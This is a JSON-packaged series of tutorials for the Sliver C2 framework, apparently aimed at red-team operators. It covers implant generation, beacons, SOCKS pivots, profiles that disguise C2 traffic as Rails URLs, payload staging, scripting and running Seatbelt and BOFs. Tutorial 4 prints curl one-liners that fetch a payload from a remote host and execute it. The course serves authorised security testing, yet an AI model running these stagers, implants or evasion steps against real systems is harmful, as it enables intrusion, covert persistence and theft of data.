{"tutorials":[{"name":"1 - Getting Started","content":"# This course is intented for the 1.6 version of Sliver, which is not yet published\n\n`sliver-server` is the binary you want to use to run the Sliver C2 server, `sliver-client` is solely a client to connect to a Sliver C2 server. Sliver server also acts as a client on its own, so you don’t necessarily run sliver server and client separately.\n\nFirst time running Sliver will take a couple seconds as its retrieving its dependencies, consecutive executions will be much faster. Go ahead and launch the `sliver-server`.\n\n```asciinema\n{\"src\": \"/asciinema/startup.cast\", \"cols\": \"132\", \"rows\": \"28\", \"idleTimeLimit\": 8}\n```\n\nLet's take a couple minutes to discuss what Sliver actually is and how its setup.\n\n![Alt text](/images/Architecture.png)\n\nNow that Sliver is running, lets generate and execute your first implant to try out some of the basic features of Sliver, for now we’re going to run everything on the local host.\n\nHere's what we're going to do: \n* Generate your implant using the `generate` command as shown below.\n* Start HTTP listener on port 80\n* Execute implant in a separate terminal\n\n```asciinema\n{\"src\": \"/asciinema/first-implant.cast\", \"cols\": \"132\", \"rows\": \"14\", \"idleTimeLimit\": 8}\n```\n\nNow let’s select our implant and run our first command using the `use` command.\n\n```bash\n[server] sliver > use\n? Select a session or beacon: \nSESSION  1884a365  RELATED_EARDRUM  [::1]:49153      test.local  tester  darwin/amd64\n[*] Active session RELATED_EARDRUM (1884a365-085f-4506-b28e-80c481730fd0)\n\n[server] sliver (RELATED_EARDRUM) > pwd\n\n[*] /Users/tester/tools\n```\n\nOnce you have reached this point, go ahead and explore some of the commands listed below. In each case first checkout the commands help using the **`-h`** flag then try it out!\n\n```bash\nExploring and interacting with the filesystem\n\nFilesystem\n  cat               Dump file to stdout\n  cd                Change directory\n  cp                Copy a file\n  download          Download a file\n  grep              Search for strings that match a regex within a file or directory\n  head              Grab the first number of bytes or lines from a file\n  ls                List current directory\n  memfiles          List current memfiles\n  mkdir             Make a directory\n  mount             Get information on mounted filesystems\n  mv                Move or rename a file\n  pwd               Print working directory\n  rm                Remove a file or directory\n  tail              Grab the last number of bytes or lines from a file\n  upload            Upload a file\n```\n\n```asciinema\n{\"src\": \"/asciinema/filesystem.cast\", \"cols\": \"132\", \"rows\": \"14\", \"idleTimeLimit\": 8}\n```\n\nGetting some environmental information\n```bash\nInfo\n  env               List environment variables\n  getgid            Get session process GID\n  getpid            Get session pid\n  getuid            Get session process UID\n  info              Get session info\n  ping              Send round trip message to implant (does not use ICMP)\n  screenshot        Take a screenshot\n  whoami            Get session user execution context\n```\nExecute a binary\n\n```asciinema\n{\"src\": \"/asciinema/execute.cast\", \"cols\": \"132\", \"rows\": \"14\", \"idleTimeLimit\": 8}\n```\n\nRunning an interactive shell\n\n```asciinema\n{\"src\": \"/asciinema/shell.cast\", \"cols\": \"132\", \"rows\": \"14\", \"idleTimeLimit\": 8}\n```\n"},{"name":"2 - Beacons vs Sessions","content":"Sliver implants support two types of connections, sessions and beacons.\n\nSessions use long-poling connections, which means they use a single TCP connection which is constantly open. Beacons on the other hand call back periodically, and will sleep when not active which can help keep their presence hidden.\n\nTypically during an engagement you will want to deploy a beacon on the target system, and switch to a session while doing more active enumeration activities.\n\nLet’s start with generating and deploying a beacon using `http`.\n\n```asciinema\n{\"src\": \"/asciinema/beacon_generation.cast\", \"cols\": \"132\", \"rows\": \"14\", \"idleTimeLimit\": 8}\n```\n\nYou can see the beacon callback times either in the `info` command or using `beacons watch`.\n\n```bash\n[server] sliver > beacons watch\n\n ID         Name            Transport   Username          Operating System   Last Check-In   Next Check-In\n========== =============== =========== ================= ================== =============== ===============\n 942c647c   TIRED_GIRAFFE   http(s)     tester   darwin/amd64       52s             12s\n\n```\n\nBeacon callback times and jitter can be set either during generation or on the fly using the `reconfig` command.\n\nThe example below sets the callback time to 5s with a 1s jitter.\n\n```bash\n[server] sliver (TIRED_GIRAFFE) > reconfig -i 5s -j 1s\n\n[*] Tasked beacon TIRED_GIRAFFE (b8aa6fd8)\n\n[+] TIRED_GIRAFFE completed task b8aa6fd8\n\n[*] Reconfigured beacon\n\n[server] sliver (TIRED_GIRAFFE) > info\n\n         Beacon ID: 942c647c-8409-4877-9fa2-b84a7f27ad45\n              Name: TIRED_GIRAFFE\n          Hostname: tester.local\n              UUID: c6de1a44-016a-5fbe-b76a-da56af41316d\n          Username: tester\n               UID: 501\n               GID: 20\n               PID: 55879\n                OS: darwin\n           Version:\n            Locale:\n              Arch: amd64\n         Active C2: https://127.0.0.1\n    Remote Address: 127.0.0.1:51803\n         Proxy URL:\n          Interval: 1m0s\n            Jitter: 30s\n     First Contact: Wed Apr 19 01:14:21 CEST 2023 (10m30s ago)\n      Last Checkin: Wed Apr 19 01:18:20 CEST 2023 (6m31s ago)\n      Next Checkin: Wed Apr 19 01:19:46 CEST 2023 (5m5s ago)\n```\n\nCommands issued for beacons can be viewed using `tasks`, the task state will indicate wether the command has completed or not.  The results of previously run tasks can be viewed using `tasks fetch`.\n\n```asciinema\n{\"src\": \"/asciinema/beacon_tasks.cast\", \"cols\": \"132\", \"rows\": \"14\", \"idleTimeLimit\": 8}\n```\n\nSession can be spun up using the `interractive` command.\n\n```asciinema\n{\"src\": \"/asciinema/beacon_interractive.cast\", \"cols\": \"132\", \"rows\": \"14\", \"idleTimeLimit\": 8}\n```\n\nBecause of the differences between sessions and beacons, certain commands like `upload` or `download` are slower on beacons due to the callback time. Others such as socks5 are not supported and only allowed for sessions. As a rule of thumb anything requiring higher network bandwith should be run from a session.\n\nLet’s switch to our newly created session and spin-up a `socks5` proxy.\n\n```bash\n\nsocks\n[server] sliver (TIRED_GIRAFFE) > use\n\n? Select a session or beacon: SESSION  131a60b9  TIRED_GIRAFFE  127.0.0.1:51969  tester.local  tester  darwin/amd64\n[*] Active session TIRED_GIRAFFE (131a60b9-db4f-4913-9064-18a17a0f09ab)\n\n[server] sliver (TIRED_GIRAFFE) > socks5 start\n\n[*] Started SOCKS5 127.0.0.1 1081\n⚠️  In-band SOCKS proxies can be a little unstable depending on protocol\n```\n\nYou can then point your browser to port 1081 to tunnel traffic through the implant to your target’s local network.\n\nTry out some of the previous commands and compare behaviour on beacons and sessions. Once you are done, you should remember to close your session using the `close` command.\n"},{"name":"3 - C2 Profiles and configuration","content":"When generating implants sliver uses a C2Profile configuration, which will be use to generate the effective network configuration of the implant. For example if configured to use /admin and /demo as callback urls, it might use one, the other or both allowing two implants using the same configuration to still seem slightly different from a network traffic perspective.\n\nC2 profile configurations can be seen using the `c2profile` command, which also allows import and export features.\n\nThe full list of possible configuration option can be found in the references section below, but for now lets instead customise the existing configuration.\n\nLets imagine we’re trying to breach a customer we've noticed uses ruby-on-rails for their applications. By default sliver will use the following extensions:\n\n- `.woff` for staging\n- `.js` for poll requests\n- `.html` for key exchanges\n- `.png` for close session\n- `.php` for session messages\n\nWe will need to update the session messages and staging with something more realistic and place all references to `woff` or `php` with something less suspicious like `css`, `rb` or `erb`.\n\nWe will also use a list of common Urls and filenames for Ruby on Rails like `https://github.com/danielmiessler/SecLists/blob/master/DiscoveryWeb-Content/ror.txt` for the `*_files` and `*_paths` variables. You could also reuse Urls discovered while enumerating your target's external perimeter in a similar way.\n\nWe will split the urls using a script like the example below, and then update the files and paths variables in our configuration file.\n\n```python\nimport json\nimport math\nimport sys\nimport random\n\n\ndef updateProfile(c2ProfileName, urls, cookieName):\n    data = open(urls).readlines()\n    c2Profile = open(c2ProfileName, \"r\").read()\n    jsonC2Profile = json.loads(c2Profile)\n\n    paths, filenames, extensions = [], [], []\n    for line in data:\n        line = line.strip()\n        if \".\" in line:\n            extensions.append(line.split(\".\")[-1])\n\n        if \"/\" in line:\n            segments = line.split(\"/\")\n            paths.extend(segments[:-1])\n            filenames.append(segments[-1].split(\".\")[0])\n\n    extensions = list(set(extensions))\n    if \"\" in extensions:\n        extensions.remove(\"\")\n    random.shuffle(extensions)\n\n    filenames = list(set(filenames))\n    if \"\" in filenames:\n        filenames.remove(\"\")\n\n    paths = list(set(paths))\n    if \"\" in paths:\n        paths.remove(\"\")\n\n    if len(extensions) < 5:\n        print(f'Got {len(extensions)} extensions, need at least 5.')\n        exit(0)\n\n    if len(paths) < 5:\n        print(f'Got {len(paths)} paths need at least 5.')\n        exit(0)\n\n    if len(filenames) < 5:\n        print(f'Got {len(filenames)} paths need at least 5.')\n        exit(0)\n\n    exts = ['poll_file_ext','stager_file_ext', 'start_session_file_ext', 'session_file_ext', 'close_file_ext' ]\n    for ext in exts:\n        jsonC2Profile[\"implant_config\"][ext] = extensions[0]\n        extensions.pop(0)\n\n    pathTypes = ['poll_paths','stager_paths', 'session_paths', 'close_paths' ]\n    for x, pathType in enumerate(pathTypes):\n        jsonC2Profile[\"implant_config\"][pathType] =  paths[math.floor(x*(len(paths)/len(pathTypes))):math.floor((x+1)*(len(paths)/len(pathTypes)))]\n\n    fileTypes = ['poll_files','stager_files', 'session_files', 'close_files']\n    for x, fileType in enumerate(fileTypes):\n        jsonC2Profile[\"implant_config\"][fileType] = filenames[math.floor(x*(len(filenames)/len(fileTypes))):math.floor((x+1)*(len(filenames)/len(fileTypes)))]\n\n    jsonC2Profile[\"server_config\"][\"cookies\"] = [cookieName]\n    c2Profile = open(c2ProfileName, \"w\")\n    c2Profile.write(json.dumps(jsonC2Profile))\n    print(\"C2 Profile updated !\")\n\n\nif __name__ == \"__main__\":\n    if len(sys.argv) < 4:\n        print(\"Usage: updateProfile.py myC2Profile myurls.txt cookieName\")\n        exit(0)\n\n    updateProfile(sys.argv[1], sys.argv[2], sys.argv[3])\n```\nThe example below demonstrates how to change and import a profile.\n\n```asciinema\n{\"src\": \"/asciinema/custom_c2profile.cast\", \"cols\": \"132\", \"rows\": \"14\", \"idleTimeLimit\": 8}\n```\n\nAt this point we can generate a new implant using our new profile.\n\n```asciinema\n{\"src\": \"/asciinema/implant_custom_c2profile.cast\", \"cols\": \"132\", \"rows\": \"14\", \"idleTimeLimit\": 8}\n```\n\nIf we review the debug logs of our implant we can see that the connections now use our new profile.\n\n```asciinema\n{\"src\": \"/asciinema/implant_debug_logs.cast\", \"cols\": \"132\", \"rows\": \"28\", \"idleTimeLimit\": 8}\n```\n\nIdeally during engagements your recon phase should inform your C2 infrastructure, reusing similar hosting providers, technologies and communication protocols can help your implant fly under the radar. \n\n"},{"name":"4 - HTTP Payload staging","content":"When using Sliver during a live engagement, you’re going to need to use custom stagers, which are essentially a first binary or commandline that will retrieve and/or load Sliver into memory on your target system. Sliver can generate shellcode for your stager to execute by using the `profiles` command.\n\nFor this exercise we will create a new beacon profile and prepare to stage it.\n\n```asciinema\n{\"src\": \"/asciinema/create_profile.cast\", \"cols\": \"132\", \"rows\": \"14\", \"idleTimeLimit\": 8}\n```\n\nIf you look at the generated implant, you'll notice the `ID` field has been populated. When downloading your payload from the staging server your URL needs to be in the form of:\n```\nhttps://sliver-ip/whatever.stager_file_ext?x=yourID\n```\n\nThere is a lot of flexibility in the form of this URL, the conditions for successfull staging are:\n* The file extension needs to match the c2 profile's stager_file_ext\n* There has to be a one character http url parameter\n* The digits found in the ID need to match an implant ID, if your implant ID is 1234, abcd1234, 12beu34 are all valid values\n\nTo expose a payload you need to use the `implants stage` command and specifically select the implant to leave accessible.\n\n```asciinema\n{\"src\": \"/asciinema/stage_implant.cast\", \"cols\": \"132\", \"rows\": \"14\", \"idleTimeLimit\": 8}\n```\n\nAt this point we can try retrieving our implant, the ID is 19778.\n\n```asciinema\n{\"src\": \"/asciinema/implant_curl.cast\", \"cols\": \"132\", \"rows\": \"14\", \"idleTimeLimit\": 8}\n```\n\nSliver staging also supports encoding or encrypting our payloads before exposing them extenrally using the `profile stage` command, the implant configuration remains the same but you are now able to stage different versions of it simultaneously.\n\n```asciinema\n{\"src\": \"/asciinema/stage_compress_encrypt.cast\", \"cols\": \"132\", \"rows\": \"14\", \"idleTimeLimit\": 8}\n```\n\nA simple stager could look like this for example in Linux:\n\n```\ncurl http://localhost/nothingtoseehere.yml?c=1234 --output nothingtoseehere && chmod u+x nothingtoseehere &&nohup ./nothingtoseehere\n```\n\nOr on Windows:\n```\ncurl http://172.20.10.3/test.woff?a=29178 -o t.exe && .\\t.exe\n```\n"},{"name":"5 - Pivots","content":"Pivots allow routing implant traffic through other implants. This can be usefull in environments that don’t have any outbound access, but are reachable from other parts of the network that you have access to.\n\nSliver supports two types of pivots, tcp which can be used on all operating systems and named pipes which are windows only.\n\nIn both cases the workflow is relatively similar, as a first step select a session and setup a pivot listener.\n\n```bash\n[server] sliver (INNER_GO-KART) > pivots tcp\n\n[*] Started tcp pivot listener :9898 with id 1\n\n[server] sliver (INNER_GO-KART) > pivots\n\n ID   Protocol   Bind Address   Number Of Pivots\n==== ========== ============== ==================\n  1   TCP        :9898                         0\n```\n\nThe listening port and interface can be configured during creation.\n\nThe next step is to generate a payload that will connect to our listener.\n\n```bash\n[server] sliver (INNER_GO-KART) > generate --tcp-pivot 127.0.0.1 --os macos\n\n[*] Generating new darwin/amd64 implant binary\n[*] Symbol obfuscation is enabled\n[*] Build completed in 12s\n[*] Implant saved to /Users/tester/tools/VALUABLE_SICK\n```\n\nExecuting this payload will cause it to connect back through our original implant and then back to our C2 server.\n"},{"name":"6 - Scripting","content":"Reactions are a basic way to automate tasks in the sliver console, they allow you to specify sliver commands to run on a list of events.\n\n```bash\nReactable Events:\n   session-connected  Triggered when a new session is opened to a target\n     session-updated  Triggered on changes to session metadata\nsession-disconnected  Triggered when a session is closed (for any reason)\n              canary  Triggered when a canary is burned or created\n          watchtower  Triggered when implants are discovered on threat intel platforms\n          loot-added  Triggered when a new piece of loot is added to the server\n        loot-removed  Triggered when a piece of loot is removed from the server\n```\n\nLet’s go ahead and create a reaction to list the current directory and environment variables when a new session checks in.\n\n```bash\nreaction set -e \"session-connected\"\n\n[*] Setting reaction to: Session Opened\n\n? Enter commands:  [Enter 2 empty lines to finish]pwd\nenv\n? Enter commands:\npwd\nenv\n\n[*] Set reaction to session-connected (id: 1)\n```\n\nThe reaction is now set, if you spin up a new session these commands will be automatically run on that session’s initial connection.\n\n```bash\n[*] Session 99c7a639 UNEXPECTED_PORTER - 127.0.0.1:59966 (test.local) - darwin/amd64 - Thu, 04 May 2023 09:04:58 CEST\n\n[*] Execute reaction: 'pwd'\n\n[*] /Users/tester\n\n[*] Execute reaction: 'env'\n\nPWD=/Users/tester\nCOLORTERM=truecolor\n...\n```\n\nYou can remove reactions using `reaction unset`.\n\nHowever, there are a couple of limitations to keep in mind when using reactions, first off these are run in the console you are currently using, which is not necessarily the server console. So if you are connected to a sliver server using the sliver client, if you disconnect the client the reactions are no longer running. \n\nSecondly reactions are a relatively basic mechanism, you can’t use any conditional statements or more complex background tasks with them. For more complex use-cases you can instead write your own client in Python or Typescript for example to connect to the server over gRPC, which we’ll cover next.\n\n## Sliver-py\n\nFor the purposes of this tutorial we’ll write our extensions using Python3, however the same result is achievable using Typescript, Golang or any other language that can handle gRPC.\n\nFirst, install the sliver-py extension using pip.\n\n```bash\npip3 install sliver-py\n```\n\nSince our extension is essentially going to be another client connection to the sliver server, you’ll also need to enable multiplayer mode and generate a new profile\n\n```bash\n[server] sliver > multiplayer\n\n[*] Multiplayer mode enabled!\n\n[server] sliver > new-operator -n tester -l 127.0.0.1\n\n[*] Generating new client certificate, please wait ...\n[*] Saved new client config to: /Users/tester/tools/tester_127.0.0.1.cfg\n```\n\nWe now have everything we need to start writing our scripts, let’s run our first example interactively in a Python shell. \nWe first need to import a few dependencies, `SliverClientConfig` which is used to parse the client config we’ve just created and `SliverClient` which will handle the connection to the backend server.\n\n```bash\nPython 3.9.16 (main, Dec  7 2022, 10:06:04)\nType 'copyright', 'credits' or 'license' for more information\nIPython 8.0.1 -- An enhanced Interactive Python. Type '?' for help.\n\nIn [1]: from sliver import SliverClientConfig, SliverClient\n\nIn [2]: DEFAULT_CONFIG = \"/Users/tester/tools/tester_127.0.0.1.cfg\"\n\nIn [3]: config = SliverClientConfig.parse_config_file(DEFAULT_CONFIG)\n\nIn [4]: client = SliverClient(config)\n\nIn [5]: await client.connect()\nOut[5]:\nMajor: 1\nMinor: 5\nPatch: 37\nCommit: \"0a43dc688ffb31a0a38511c47e8547a44a6918d4\"\nCompiledAt: 1681408237\nOS: \"darwin\"\nArch: \"arm64\"\n```\n\nFrom this point on we can use the client object to interact with the server, let’s start with listing any sessions or beacons that might be currently connected.\n\n```bash\nIn [6]: beacons = await client.beacons()\n\nIn [7]: sessions = await client.sessions()\n\nIn [8]: beacons\nOut[8]: []\n\nIn [9]: sessions\nOut[9]:\n[ID: \"f80ec897-0870-4f03-a1b1-364e5a0d243c\"\n Name: \"UNEXPECTED_PORTER\"\n Hostname: \"test.local\"\n UUID: \"c6de1a44-016a-5fbe-b76a-da56af41316d\"\n Username: \"tester\"\n UID: \"501\"\n GID: \"20\"\n OS: \"darwin\"\n Arch: \"amd64\"\n Transport: \"http(s)\"\n RemoteAddress: \"127.0.0.1:60218\"\n PID: 74773\n Filename: \"/Users/tester/tools/UNEXPECTED_PORTER\"\n LastCheckin: 1683185925\n ActiveC2: \"http://127.0.0.1\"\n ReconnectInterval: 60000000000\n PeerID: 4416183373589698218\n FirstContact: 1683185429]\n```\n\nTo run commands on this session you’ll need to create an InteractiveSession object.\n\n```bash\nIn [10]: interract = await client.interact_session(\"f80ec897-0870-4f03-a1b1-364e5a0d243c\")\n\nIn [11]: await interract.pwd()\nOut[11]: Path: \"/Users/tester\"\n```\n\nNow that we’ve got the basics of connecting to sliver and running commands down let’s write a more useful script that will display the hosts file when a new session checks in. Our goal is to first identify the Operating System, and then based on that retrieve and display the contents of the hosts file if it exists. Because this script will wait and react to events emitted by the Sliver server, we’re going to use `asyncio` to write our client.\n\n```bash\n#!/usr/bin/env python3\n\nimport os\nimport asyncio\nfrom sliver import SliverClientConfig, SliverClient\nimport gzip\n\nDEFAULT_CONFIG = \"/Users/tester/tools/neo_127.0.0.1.cfg\"\n\nasync def main():\n    ''' Client connect example '''\n    config = SliverClientConfig.parse_config_file(DEFAULT_CONFIG)\n    client = SliverClient(config)\n    await client.connect()\n\n\t\tasync for event in client.on('session-connected'):\n        print('Session %s just connected !' % event.Session.ID)\n\nif __name__ == '__main__':\n    loop = asyncio.get_event_loop()\n    loop.run_until_complete(main())\n```\n\nAs shown above we can access the session object through `event.Session`. Let’s go ahead and add a few conditions based on the operating system.\n\n```bash\nif event.Session.OS == \"darwin\":\n            print('Session is running on macOS')\n\nelif event.Session.OS == \"Linux\":\n            print('Session is running on Linux')\nelif event.Session.OS == \"Windows\"\n            print('Session is running on Windows')\nelse:\n            print('Session is running on %s', event.Session.OS)\n```\n\nLet’s setup an InteractiveSession object like previously.\n\n```bash\ninteract = await client.interact_session(event.Session.ID)\n```\n\nWe’re going to start with writing the code for Linux and Macos, since in their case the file is located in the same place. First we check if the file exists, then we download and decompress it to display its contents using gzip.\n\n```bash\nfile_listing = await interact.ls(\"/etc/hosts\")\nif file_listing.Exists:\n\tgzipFile = await interact.download(\"/etc/hosts\")\n  contents = gzip.decompress(gzipFile.Data)\n  print('%r' % contents)\n```\n\nThe code for Windows is relatively similar the only major difference being the file location.\n\n```bash\nfile_listing = await interact.ls(\"C:/Windows/System32/drivers/etc/hosts\")\nif file_listing.Exists:\n\tgzipFile = await interact.download(\"C:/Windows/System32/drivers/etc/hosts\")\n  contents = gzip.decompress(gzipFile.Data)\n  print('%r' % contents)\n```\n\nIf we run our script and spin up a few sessions we should start to see hosts files being retrieved.\n\n```bash\npython3.11 autocat.py\nAutomatically interacting with session 16338c85-b670-44ab-ac83-2df885654b07\nb\"# Copyright (c) 1993-2009 Microsoft Corp.\\r\\n#\\r\\n# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.\\r\\n#\\r\\n# ...\n\nAutomatically interacting with session 93fcbab2-f00d-44a4-944a-e1ea8ec324e2\nb'##\\n# Host Database\\n#\\n# localhost is used to configure the loopback interface\\n# when the system is booting.  Do not change this entry.\\n##\\n127.0.0.1...\n```\n"},{"name":"7 - Assemblies and Bofs","content":"The Sliver armory is used to install and maintain third party extensions and aliases within sliver. The full list of available extensions can be found at https://github.com/sliverarmory/armory, keep in mind this is community maintained so not all modules are necessarily up to date. \n\nYou can download all configured extensions/aliases using the armory command.\n\n```bash\n[server] sliver > armory install all\n? Install 18 aliases and 84 extensions? Yes\n[*] Installing alias 'SharpSecDump' (v0.0.1) ... done!\n[*] Installing alias 'SharpChrome' (v0.0.1) ... done!\n[*] Installing alias 'SharpDPAPI' (v0.0.1) ... done!\n[*] Installing alias 'SharpMapExec' (v0.0.1) ... done!\n[*] Installing alias 'KrbRelayUp' (v0.0.1) ... done!\n[*] Installing alias 'SharpRDP' (v0.0.1) ... done!\n[*] Installing alias 'SharpUp' (v0.0.1) ... done!\n[*] Installing alias 'SharpView' (v0.0.1) ... done!\n[*] Installing alias 'SharPersist' (v0.0.1) ... done!\n[*] Installing alias 'Sharp WMI' (v0.0.2) ... done!\n...\n[*] All packages installed\n```\n\nThese commands can then be used in the context of a session or beacon similarly to other commands, with a couple caveats.\n\nLet’s go ahead and run our first assembly.\n\n```bash\n[server] sliver (UNABLE_PRIDE) > seatbelt \" WindowsCredentialFiles\"\n\n[*] seatbelt output:\n\n                        %&&@@@&&\n                        &&&&&&&%%%,                       #&&@@@@@@%%%%%%###############%\n                        &%&   %&%%                        &////(((&%%%%%#%################//((((###%%%%%%%%%%%%%%%\n%%%%%%%%%%%######%%%#%%####%  &%%**#                      @////(((&%%%%%%######################(((((((((((((((((((\n#%#%%%%%%%#######%#%%#######  %&%,,,,,,,,,,,,,,,,         @////(((&%%%%%#%#####################(((((((((((((((((((\n#%#%%%%%%#####%%#%#%%#######  %%%,,,,,,  ,,.   ,,         @////(((&%%%%%%%######################(#(((#(#((((((((((\n#####%%%####################  &%%......  ...   ..         @////(((&%%%%%%%###############%######((#(#(####((((((((\n#######%##########%#########  %%%......  ...   ..         @////(((&%%%%%#########################(#(#######((#####\n###%##%%####################  &%%...............          @////(((&%%%%%%%%##############%#######(#########((#####\n#####%######################  %%%..                       @////(((&%%%%%%%################\n                        &%&   %%%%%      Seatbelt         %////(((&%%%%%%%%#############*\n                        &%%&&&%%%%%        v1.1.1         ,(((&%%%%%%%%%%%%%%%%%,\n                         #%%%%##,\n\n====== WindowsCredentialFiles ======\n\n  Folder : C:\\Users\\defaultuser0\\AppData\\Local\\Microsoft\\Credentials\\\n\n   ...\n```\n\nAs you can see Sliver ran the Seatbelt assembly and provided us with the output of our command.\n\n## Bof’s\n\nBeacon object files are loaded using trustedsec’s coffloader, when you run a bof command the loader will first be loaded into memory and is used to run whichever bof you choose. From an operator’s perspective bof’s are similar to basic sliver commands.\n\n```bash\n[server] sliver (UNABLE_PRIDE) > sa-whoami\n\n[*] Successfully executed sa-whoami (coff-loader)\n[*] Got output:\n\nUserName\t\tSID\n====================== ====================================\ntest.local\\tester\n\nGROUP INFORMATION                                 Type                     SID                                          Attributes\n================================================= ===================== ============================================= ==================================================\ntest.local\\None                              Group                    S-1-5-21-3109228153-3872411817-1195593578-513 Mandatory group, Enabled by default, Enabled group,\nEveryone                                          Well-known group         S-1-1-0                                       Mandatory group, Enabled by default, Enabled group,\nNT AUTHORITY\\Local account and member of Administrators groupWell-known group         S-1-5-114\nBUILTIN\\Administrators                            Alias                    S-1-5-32-544\nBUILTIN\\Performance Log Users                     Alias                    S-1-5-32-559                                  Mandatory group, Enabled by default, Enabled group,\nBUILTIN\\Users                                     Alias                    S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group,\nNT AUTHORITY\\INTERACTIVE                          Well-known group         S-1-5-4                                       Mandatory group, Enabled by default, Enabled group,\nCONSOLE LOGON                                     Well-known group         S-1-2-1                                       Mandatory group, Enabled by default, Enabled group,\nNT AUTHORITY\\Authenticated Users                  Well-known group         S-1-5-11                                      Mandatory group, Enabled by default, Enabled group,\nNT AUTHORITY\\This Organization                    Well-known group         S-1-5-15                                      Mandatory group, Enabled by default, Enabled group,\nNT AUTHORITY\\Local account                        Well-known group         S-1-5-113                                     Mandatory group, Enabled by default, Enabled group,\nLOCAL                                             Well-known group         S-1-2-0                                       Mandatory group, Enabled by default, Enabled group,\nNT AUTHORITY\\NTLM Authentication                  Well-known group         S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group,\nMandatory Label\\Medium Mandatory Level            Label                    S-1-16-8192                                   Mandatory group, Enabled by default, Enabled group,\n\nPrivilege Name                Description                                       State\n============================= ================================================= ===========================\nSeShutdownPrivilege           Shut down the system                              Disabled\nSeChangeNotifyPrivilege       Bypass traverse checking                          Enabled\nSeUndockPrivilege             Remove computer from docking station              Disabled\nSeIncreaseWorkingSetPrivilege Increase a process working set                    Disabled\nSeTimeZonePrivilege           Change the time zone                              Disabled\n```\n\nSince these payloads are run in-process, they have similar advantages and drawbacks as in-process assemblies meaning no new processes are spawned on execution, but a crash risks loosing the implant.\n"}]}